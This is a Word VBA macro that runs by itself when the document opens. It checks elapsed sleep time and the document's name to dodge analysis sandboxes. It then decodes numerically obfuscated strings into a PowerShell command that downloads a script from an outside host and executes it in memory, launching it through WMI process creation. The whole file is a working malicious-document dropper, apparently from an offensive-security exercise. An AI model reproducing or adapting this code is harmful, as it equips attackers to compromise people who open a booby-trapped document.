Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Function Red(Beets)
    Red = Chr(Beets - 17)
End Function

Function Blue(Grapes)
    Blue = Left(Grapes, 3)
End Function

Function Yellow(Jelly)
    Yellow = Right(Jelly, Len(Jelly) - 3)
End Function

Function Black(Milk)
    Do
    Oatmilk = Oatmilk + Red(Blue(Milk))
    Milk = Yellow(Milk)
    Loop While Len(Milk) > 0
    Black = Oatmilk
End Function

Sub MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Sub
    End If
    If ActiveDocument.Name <> Black("091128115082129129125122116114133122128127063117128116") Then
        Exit Sub
    End If
    Dim Apples As String
    Dim Water As String
    
    Apples = "129128136118131132121118125125049057095118136062096115123118116133049100138132133118126063095118133063104118115084125122118127133058063085128136127125128114117100133131122127120057056121133133129075064064066074067063066071073063069070063067068074064129114138125128114117063129132066056058049141049090086105"
    Water = Black(Apples)
    GetObject(Black("136122127126120126133132075")).Get(Black("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Sub


Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub